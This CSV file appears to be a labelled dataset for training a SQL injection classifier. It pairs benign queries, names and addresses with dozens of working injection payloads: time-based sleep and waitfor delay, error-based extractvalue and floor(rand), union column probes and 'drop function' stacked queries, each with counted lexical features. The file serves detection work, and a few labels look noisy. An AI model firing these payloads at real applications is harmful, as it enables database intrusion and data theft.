Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
select * from path where price not between 10 and 20,0,select from path where price not between and,52,8,0,0,0,0,10,2,1,37,6,0
from  ( select distinct sum from science ) ,0,from select distinct sum from science,43,6,0,0,0,0,8,0,0,32,4,1
select far from where union all select situation from sides order by separate,0,select far from where union all select situation from sides order by separate,77,13,0,0,0,0,12,0,0,65,9,0
"1""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""fjwv"" like ""fjwv",1,and in char char char char char select case when then char else char end char char char char char and fjwv like fjwv,385,24,0,4,1,0,81,2,10,93,10,12
"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'xzlx' like 'xzlx",1,or row select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from select union select union select union select group by and xzlx like xzlx,323,25,4,0,8,0,61,2,3,113,15,5
"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,and ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr,327,22,0,0,25,0,70,1,0,81,8,10
"-2872  )   where 8797  =  8797 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,where or group by concat 0x7171706a71 select case when then else end 0x717a767a71 floor rand having min,225,17,0,0,6,1,44,1,2,68,11,3
stapley@cirugiaplasticacordoba.jm,0,stapley cirugiaplasticacordoba jm,33,3,0,0,2,0,0,0,0,31,0,0
wittik,0,wittik,6,1,0,0,0,0,0,0,0,6,0,0
"  select laid,funny,once from lead left join orders on ready.pitchid =  tree.rise order by sure.came",0,select laid funny once from lead left join orders on ready pitchid tree rise order by sure came,100,18,0,0,6,0,14,0,0,78,7,1
" select * from users where id  =  1 or "".#"" or 1  =  1 -- 1",1,select from users where id or or,59,7,0,2,4,2,16,2,3,26,5,0
-1479%' or 5201  =  3398--,1,or,26,1,1,0,2,1,4,1,3,2,0,0
"-2028'   )    )     )   union all select 8698,8698,8698,8698#",1,union all select,61,3,1,0,4,1,7,0,1,14,3,0
18726543n,0,18726543n,9,1,0,0,0,0,0,0,0,1,0,0
if  (  2643  =  1393  )   select 2643 else drop function nqss--,1,if select else drop function nqss,63,6,0,0,1,1,11,0,2,28,4,1
xg,0,xg,2,1,0,0,0,0,0,0,0,2,0,0
select * from look where were = 'possible' limit 3,0,select from look where were possible limit,50,7,2,0,1,0,9,0,1,36,4,0
45591,0,,5,0,0,0,0,0,0,0,0,0,0,0
"  select * from heavy where compare not in  ( 'team', 'attack', 'underline' )  ",0,select from heavy where compare not in team attack underline,79,10,6,0,2,0,14,1,1,51,5,0
"pl. ingeniero torres quevedo, s/n 7?a",0,pl ingeniero torres quevedo,37,4,0,0,3,0,5,0,1,27,0,0
select * from helpful 3 select * from store,0,select from helpful select from store,43,6,0,0,0,0,8,0,2,32,4,0
saviange_files@zytel.nc,0,saviange_files zytel nc,23,3,0,0,3,0,0,0,0,20,0,0
select * from carried where price not between 10 and 20,0,select from carried where price not between and,55,8,0,0,0,0,10,2,1,40,6,0
c/ atlantico 167,0,atlantico,16,1,0,0,0,0,2,0,1,10,0,0
select * from those,0,select from those,19,3,0,0,0,0,3,0,1,15,2,0
chanco,0,chanco,6,1,0,0,0,0,0,0,0,6,0,0
"1%"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,1,and dbms_utility sqlid_to_sqlhash chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and,352,22,0,4,29,0,72,2,0,94,9,12
select * from say where triangle between '1996-07-01' and '1996-07-31',0,select from say where triangle between and,70,7,4,0,0,0,9,1,5,36,5,0
select avg ( against )  from caught  select sum ( pull ) ,0,select avg against from caught select sum pull,57,8,0,0,0,0,12,0,0,39,3,2
"1"" where 2989  =  2989 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,where or select count from generate_series,112,6,0,1,4,1,20,1,3,36,4,1
select bottom from noted,0,select bottom from noted,24,4,0,0,0,0,3,0,0,21,2,0
10817,0,,5,0,0,0,0,0,0,0,0,0,0,0
1   )    )    and   (  3020  =  3020  )  *6703 and    (    (   3078  =  3078,1,and and,76,2,0,0,2,0,15,2,1,6,2,0
select * from require where headed = 'gravity'  or writing = 'game',0,select from require where headed gravity or writing game,67,9,4,0,2,0,11,1,1,48,4,0
1  )   where 5651  =  5651,1,where,26,1,0,0,1,0,5,0,0,5,0,0
"  select water as dug, composition as [situation]  from nodded",0,select water as dug composition as situation from nodded,62,9,0,0,3,0,9,0,0,48,4,0
select * from wolf 3,0,select from wolf,20,3,0,0,0,0,4,0,1,14,2,0
select avg ( noon ) from finger,0,select avg noon from finger,31,5,0,0,0,0,6,0,0,23,2,1
"   select count ( roll ) , field from die by are",0,select count roll field from die by are,48,8,0,0,1,0,11,0,0,32,3,1
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 11514 )  order by meta_id asc",0,select post_id meta_key meta_value from wp_postmeta where post_id in order by meta_id asc,103,13,0,0,8,0,15,0,0,71,7,0
select * from long where ten = 'larger'  or from = 'construction',0,select from long where ten larger or from construction,65,9,4,0,2,0,11,1,1,46,5,0
 update motor set traffic = 'tobacco'where east = 'species',0,update motor set traffic tobacco where east species,59,8,4,0,2,0,9,0,0,44,3,0
raphael,0,raphael,7,1,0,0,0,0,0,0,0,7,0,0
"1""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""ecoa"" like ""ecoa",1,and select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5 and ecoa like ecoa,175,18,0,4,10,0,27,2,1,78,5,1
select count ( leaf ) from select,0,select count leaf from select,33,5,0,0,0,0,6,0,0,25,3,1
sal37a,0,sal37a,6,1,0,0,0,0,0,0,0,4,0,0
select * from spider fetch first 50 percent rows only,0,select from spider fetch first percent rows only,53,8,0,0,0,0,9,0,1,41,3,0
37655511a,0,37655511a,9,1,0,0,0,0,0,0,0,1,0,0
-3849  )   or 5580  =  3442--,1,or,29,1,0,0,1,1,5,1,3,2,0,0
1   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  5368  =  5368,1,and dbms_utility sqlid_to_sqlhash chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and,388,22,0,0,27,0,78,2,0,94,9,12
select pride ( s ) from enjoy inner join,0,select pride from enjoy inner join,40,6,0,0,0,0,8,0,0,30,4,0
select min ( religious )  as bottom from situation,0,select min religious as bottom from situation,50,7,0,0,0,0,8,0,0,39,3,0
"  select instance,myself,loose from world left join orders on disease.harderid =  eaten.affect order by enough.lucky",0,select instance myself loose from world left join orders on disease harderid eaten affect order by enough lucky,116,18,0,0,6,0,14,0,0,94,7,1
select * from fastened,0,select from fastened,22,3,0,0,0,0,3,0,1,18,2,0
select bush ( s )  from weigh union,0,select bush from weigh union,35,5,0,0,0,0,7,0,0,25,3,0
select * from gate fetch first 50 percent rows only,0,select from gate fetch first percent rows only,51,8,0,0,0,0,9,0,1,39,3,0
select * from merely,0,select from merely,20,3,0,0,0,0,3,0,1,16,2,0
"1  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1,and char char char char regexp_substring repeat left crypt_key char char char null null,237,14,0,0,17,0,48,1,0,72,4,11
zael,0,zael,4,1,0,0,0,0,0,0,0,4,0,0
select * from guess where mirror = 'white'  and  ( gentle = 'fought' or headed = 'object' ) ,0,select from guess where mirror white and gentle fought or headed object,92,12,6,0,3,0,18,2,1,60,5,0
"-4919  )   union all select 2608,2608,2608,2608,2608,2608#",1,union all select,58,3,0,0,6,1,5,0,1,14,3,0
"arco del meson, 47,",0,arco del meson,19,3,0,0,2,0,3,0,0,12,0,0
"1   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  4127  =  4127",1,and row select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from select union select union select union select group by and,343,22,0,0,9,0,65,2,3,102,14,5
select top 3 * from daily where wood = 'appropriate' select * from income,0,select top from daily where wood appropriate select from income,73,10,2,0,1,0,13,0,2,54,6,0
select * from real fetch first 3 rows only select top 50 percent * from traffic,0,select from real fetch first rows only select top percent from traffic,79,12,0,0,0,0,15,0,2,59,6,0
iza,0,iza,3,1,0,0,0,0,0,0,0,3,0,0
"-1055"" or   (  8459  =  8459  )  *4906 and ""kdbr""  =  ""kdbr",1,or and kdbr kdbr,59,4,0,4,2,0,11,2,2,13,2,0
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1,and in char char char char char select case when then char else char end char char char char char,328,20,1,0,1,0,72,1,10,78,8,12
select your ( s )  from onto full outer join,0,select your from onto full outer join,44,7,0,0,0,0,9,0,0,32,4,0
select count ( thee )  from while,0,select count thee from while,33,5,0,0,0,0,6,0,0,24,2,1
"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,and select from select sleep gcrr,98,6,0,1,2,1,20,1,1,28,4,1
adjani@zoorapia.ma,0,adjani zoorapia ma,18,3,0,0,2,0,0,0,0,16,0,0
empuar,0,empuar,6,1,0,0,0,0,0,0,0,6,0,0
1'   )    )    as pgif where 6346  =  6346,1,as pgif where,42,3,1,0,1,0,8,0,0,11,2,0
select count ( stop ) from grow,0,select count stop from grow,31,5,0,0,0,0,6,0,0,23,2,1
select * from customers  where city not like '[bsp]%';,0,select from customers where city not like bsp,54,8,2,0,4,0,8,1,1,38,5,0
"  select * from egg where express in  ( 'correctly', 'fur', 'car' )  ",0,select from egg where express in correctly fur car,69,9,6,0,2,0,13,0,1,42,4,0
"select pg_sleep  (  5  )   and    (    (     (  ""wqeb""  =  ""wqeb",1,select pg_sleep and wqeb wqeb,64,5,0,3,2,0,11,1,0,24,2,1
-8860  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1,or select upper xmltype chr chr chr chr chr chr chr select case when then else end from dual chr chr chr chr chr chr from dual,402,27,0,0,28,0,88,1,1,100,10,15
"1""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""dnmi"" like ""dnmi",1,or dbms_pipe receive_message chr chr chr chr and dnmi like dnmi,152,11,0,4,11,0,29,2,0,51,3,6
if  (  8574  =  7534  )   select 8574 else drop function nxbe--,1,if select else drop function nxbe,63,6,0,0,1,1,11,0,2,28,4,1
sotobaado y priorato,0,sotobaado priorato,20,2,0,0,0,0,2,0,0,18,0,0
select   (  case when   (  4306  =  2815  )   then 4306 else 1/  (  select 0  )   end  )  --,1,select case when then else select end,92,7,0,0,1,1,19,0,3,31,7,0
terland-bartha5@informatica2009.ck,0,terland bartha5 informatica2009 ck,34,4,0,0,2,0,0,0,1,26,0,0
"1%""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,1,and select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4 and,167,21,0,4,11,0,28,2,1,75,8,1
select * from were where solve like '�t%',0,select from were where solve like,41,6,2,0,1,0,7,0,1,29,4,0
"1'+  (  select pepf where 5071  =  5071 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,select pepf where or select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,166,23,1,0,9,1,28,1,4,86,9,1
28782647x,0,28782647x,9,1,0,0,0,0,0,0,0,1,0,0
"1' union all select null,null,null,null--",1,union all select null null null null,41,7,1,0,3,1,4,0,2,30,7,0
select * from gold where greatly = 'consonant' limit 3,0,select from gold where greatly consonant limit,54,7,2,0,1,0,9,0,1,40,4,0
"1""   )    )    as dvpb where 6673  =  6673",1,as dvpb where,42,3,0,1,1,0,8,0,0,11,2,0
select * from common where equipment = 'sleep' fetch first 3 rows only,0,select from common where equipment sleep fetch first rows only,70,10,2,0,1,0,12,0,1,53,4,1
"  select locate ( ""com"", ""w3schools.com"", 3 )  as matchposition;",0,select locate com w3schools com as matchposition,64,7,0,4,4,0,9,0,0,41,2,1
67242195q,0,67242195q,9,1,0,0,0,0,0,0,0,1,0,0
"1%""  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,and char char char char regexp_substring repeat right char null,184,10,0,1,12,1,36,1,2,53,3,8
50174,0,,5,0,0,0,0,0,0,0,0,0,0,0
select wp_posts.* from wp_posts where id in  ( 367657 ) ,0,select wp_posts from wp_posts where id in,56,7,0,0,3,0,10,0,1,33,4,0
raimondo,0,raimondo,8,1,0,0,0,0,0,0,0,8,0,0
" select column_name ( s )  from garden,bone",0,select column_name from garden bone,43,5,0,0,2,0,7,0,0,31,2,0
"1  )   and make_set  (  4593  =  7765,7765  )   and   (  8517  =  8517",1,and make_set and,70,3,0,0,4,0,13,2,0,13,2,1
select * from heat  where slight = activity,0,select from heat where slight activity,43,6,0,0,1,0,7,0,1,33,3,0
modigh,0,modigh,6,1,0,0,0,0,0,0,0,6,0,0
rub de bracamonte,0,rub de bracamonte,17,3,0,0,0,0,2,0,0,15,0,0
williams9,0,williams9,9,1,0,0,0,0,0,0,0,8,0,0
"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'xdui' like 'xdui",1,or select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5 and xdui like xdui,174,18,4,0,10,0,27,2,1,77,5,1
fontellas,0,fontellas,9,1,0,0,0,0,0,0,0,9,0,0
select * from outline  where simplest not like '[hill]%',0,select from outline where simplest not like hill,56,8,2,0,3,0,8,1,1,41,5,0
select * from fog  where separate = able,0,select from fog where separate able,40,6,0,0,1,0,7,0,1,30,3,0
7.20299e+15,0,20299e,11,1,0,0,1,0,0,0,1,1,0,0
"admin"" or 1  =  1/*",1,admin or,19,2,0,1,1,1,4,1,0,7,1,0
1   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   3069  =  3069,1,or select from pg_sleep and,104,5,0,0,3,0,20,2,0,22,4,1
select * from course where sink between '1996-07-01' and '1996-07-31',0,select from course where sink between and,69,7,4,0,0,0,9,1,5,35,5,0
8.76216e+15,0,76216e,11,1,0,0,1,0,0,0,1,1,0,0
"1""  )   where 2278  =  2278",1,where,27,1,0,1,1,0,5,0,0,5,0,0
flo hosta,0,flo hosta,9,2,0,0,0,0,1,0,0,8,0,0
 (  select   (  case when   (  3348  =  1710  )   then 3348 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,1,select case when then else cast as int select from dual end from dual,139,14,0,0,1,0,32,0,1,56,10,0
8759,0,,4,0,0,0,0,0,0,0,0,0,0,0
select avg ( wherever ) from entirely select sum ( call ) ,0,select avg wherever from entirely select sum call,58,8,0,0,0,0,12,0,0,42,4,2
select min ( of )  as religious from hat,0,select min of as religious from hat,40,7,0,0,0,0,8,0,0,29,3,0
select origin from method union all select principle from battle order by one,0,select origin from method union all select principle from battle order by one,77,13,0,0,0,0,12,0,0,65,8,0
select warm ( s )  from animal union,0,select warm from animal union,36,5,0,0,0,0,7,0,0,26,3,0
select top 3 * from hay where religious = 'battle' select * from slip,0,select top from hay where religious battle select from slip,69,10,2,0,1,0,13,0,2,50,6,0
33987,0,,5,0,0,0,0,0,0,0,0,0,0,0
select shelf ( s )  from none union all,0,select shelf from none union all,39,6,0,0,0,0,8,0,0,28,4,0
select dangerous,0,select dangerous,16,2,0,0,0,0,1,0,0,15,1,0
"1' where 2162  =  2162 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,where procedure analyse extractvalue concat 0x5c benchmark md5 0x4b774c75,165,9,1,0,6,1,26,0,0,55,1,6
vilanova de arousa,0,vilanova de arousa,18,3,0,0,0,0,2,0,0,16,0,0
"1""   )    )    and 9198  =  9198--",1,and,34,1,0,1,1,1,6,1,2,3,0,0
select * from early 3,0,select from early,21,3,0,0,0,0,4,0,1,15,2,0
chapurrar,0,chapurrar,9,1,0,0,0,0,0,0,0,9,0,0
niwinska@estudiodeyoga.td,0,niwinska estudiodeyoga td,25,3,0,0,2,0,0,0,0,23,0,0
select sing ( s )  from engineer full outer join,0,select sing from engineer full outer join,48,7,0,0,0,0,9,0,0,36,4,0
" select * from users where id  =  1 + \\+%1 union select null,@@version -- 1",1,select from users where id union select null version,75,9,0,0,6,1,15,0,5,44,6,1
3.18663e+15,0,18663e,11,1,0,0,1,0,0,0,1,1,0,0
garzon6@mtos.ro,0,garzon6 mtos ro,15,3,0,0,2,0,0,0,0,12,0,0
select * from voice where production between '1996-07-01' and '1996-07-31',0,select from voice where production between and,74,7,4,0,0,0,9,1,5,40,5,0
1   )    )    as pmff where 6649  =  6649,1,as pmff where,41,3,0,0,1,0,8,0,0,11,2,0
"1%""   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,or select count from domain domains as t1 domain columns as t2 domain tables as t3,130,16,0,1,7,1,21,1,3,64,6,1
select * from bicycle where slabs = 'position'  or breathe = 'settlers',0,select from bicycle where slabs position or breathe settlers,71,9,4,0,2,0,11,1,1,52,4,1
l1b6855ca30e,0,l1b6855ca30e,12,1,0,0,0,0,0,0,0,5,0,0
select avg ( third ) from whether,0,select avg third from whether,33,5,0,0,0,0,6,0,0,25,2,1
musson@ajuntamentdebarcelona20.pr,0,musson ajuntamentdebarcelona20 pr,33,3,0,0,2,0,0,0,0,29,0,0
if  (  6554  =  1534  )   select 6554 else drop function buqb--,1,if select else drop function buqb,63,6,0,0,1,1,11,0,2,28,4,1
"-6548%""  )   union all select 6067,6067,6067,6067,6067,6067,6067,6067,6067--",1,union all select,76,3,0,1,9,1,5,0,3,14,3,0
kingston@professionalhost.com.ag,0,kingston professionalhost com ag,32,4,0,0,3,0,0,0,0,29,0,0
1  )   as bidc where 5268  =  5268 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1,as bidc where and select from select sleep fzno,113,9,0,0,1,1,24,1,3,39,6,1
1'||  (  select 'ylio' from dual where 3767  =  3767 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||',1,select ylio from dual where and in char char char char char select case when then char else char end char char char char char,389,25,4,0,6,0,82,1,10,101,11,12
select * from allow 3,0,select from allow,21,3,0,0,0,0,4,0,1,15,2,0
"   select count ( minute ) , office from mass by alive",0,select count minute office from mass by alive,54,8,0,0,1,0,11,0,0,38,3,1
1%'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   '%'  =  ',1,and qqpjq select case when then else end from rdb database qzvzq and,155,13,8,0,9,0,29,2,0,56,9,1
"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk",1,and select from pg_sleep and cjkk like cjkk,96,8,0,4,2,0,18,2,0,35,5,1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""eboa"" like ""eboa",1,select dbms_pipe receive_message chr chr chr chr from dual and eboa like eboa,148,13,0,3,10,0,27,1,0,63,4,6
"1""   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   ""cyyh""  =  ""cyyh",1,or row select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from select union select union select union select group by and cyyh cyyh,336,24,0,4,9,0,63,2,3,109,14,5
31439,0,,5,0,0,0,0,0,0,0,0,0,0,0
termmetro,0,termmetro,9,1,0,0,0,0,0,0,0,9,0,0
pred6.finir,0,pred6 finir,11,2,0,0,1,0,0,0,0,9,0,0
grajera sampol,0,grajera sampol,14,2,0,0,0,0,1,0,0,13,0,0
18898337l,0,18898337l,9,1,0,0,0,0,0,0,0,1,0,0
efran,0,efran,5,1,0,0,0,0,0,0,0,5,0,0
"select * from generate_series  (  9709,9709,case when   (  9709  =  7795  )   then 1 else 0 end  )   limit 1--",1,select from generate_series case when then else end limit,110,9,0,0,4,1,19,0,3,48,8,0
ae57f5r4,0,ae57f5r4,8,1,0,0,0,0,0,0,0,4,0,0
select army ( s )  from coach left join,0,select army from coach left join,39,6,0,0,0,0,8,0,0,28,4,1
uef,1,uef,3,1,0,0,0,0,0,0,0,3,0,0
select safe,0,select safe,11,2,0,0,0,0,1,0,0,10,1,0
"waitfor delay '0:0:5' and    (    (     (  ""mfro"" like ""mfro",1,waitfor delay and mfro like mfro,60,6,2,3,2,0,9,1,0,27,2,2
c8nde9a,0,c8nde9a,7,1,0,0,0,0,0,0,0,5,0,0
"1%""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""%""  =  """,1,or select from select sleep ydpu and,127,7,0,4,3,0,26,2,1,30,5,1
select connected from flat,0,select connected from flat,26,4,0,0,0,0,3,0,0,23,2,0
"select wp_posts.* from wp_posts where id in  ( 28313,28341 ) ",0,select wp_posts from wp_posts where id in,61,7,0,0,4,0,10,0,1,33,4,0
" select * from root order by electric asc, remarkable desc",0,select from root order by electric asc remarkable desc,58,9,0,0,1,0,10,0,1,46,6,0
1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'jhlj'  =  'jhlj,1,and utl_inaddr get_host_address chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and jhlj jhlj,354,24,4,0,27,0,72,2,0,100,9,10
"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'kyxl'  =  'kyxl",1,and make_set and kyxl kyxl,74,5,4,0,4,0,13,2,0,21,2,1
delete from cannot where zebra = 'troops',0,delete from cannot where zebra troops,41,6,2,0,1,0,6,0,0,32,3,0
"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""thkh"" like ""thkh",1,and extractvalue concat 0x5c 0x7171706a71 select elt 0x717a767a71 and thkh like thkh,172,12,0,4,6,0,26,2,0,52,4,3
select * from have where price not between 10 and 20,0,select from have where price not between and,52,8,0,0,0,0,10,2,1,37,6,0
"1%'  )   union all select null,null,null,null,null,null,null,null,null,null#",1,union all select null null null null null null null null null null,76,13,1,0,11,1,5,0,0,54,13,0
"insert into motor ( gasoline, something, single, because, below, announced )  values  ( 'gather', 'produce'. fight', 'chart', 'plate', 'meat', 'nose' )  ",0,insert into motor gasoline something single because below announced values gather produce fight chart plate meat nose,153,17,13,0,11,0,21,0,0,101,3,0
select wife ( s )  from balance union all,0,select wife from balance union all,41,6,0,0,0,0,8,0,0,30,4,0
select * from strip fetch first 50 percent rows only,0,select from strip fetch first percent rows only,52,8,0,0,0,0,9,0,1,40,3,0
"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",1,as pbgg where union all select,84,6,0,0,4,1,12,0,3,25,5,0
select top 3 * from save,0,select top from save,24,4,0,0,0,0,5,0,1,17,3,0
alegra,0,alegra,6,1,0,0,0,0,0,0,0,6,0,0
select avg ( police )  from sang  select sum ( known ) ,0,select avg police from sang select sum known,55,8,0,0,0,0,12,0,0,37,3,2
" select column_name ( s )  from due,musical",0,select column_name from due musical,43,5,0,0,2,0,7,0,0,31,2,0
"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",1,or select count from generate_series and ubxw like ubxw,136,9,0,4,3,0,23,2,1,46,5,1
"1%'  )   union all select null,null,null,null,null,null,null,null,null,null--",1,union all select null null null null null null null null null null,77,13,1,0,10,1,5,0,2,54,13,0
select   (  case when   (  8208  =  7960  )   then 8208 else 8208*  (  select 8208 from information_schema.character_sets  )   end  )  #,1,select case when then else select from information_schema character_sets end,136,10,0,0,5,1,21,0,1,65,8,0
delete from social,0,delete from social,18,3,0,0,0,0,2,0,0,16,2,0
1  )   or pg_sleep  (  __time__  )  --,1,or pg_sleep __time__,38,3,0,0,5,1,7,1,2,13,1,1
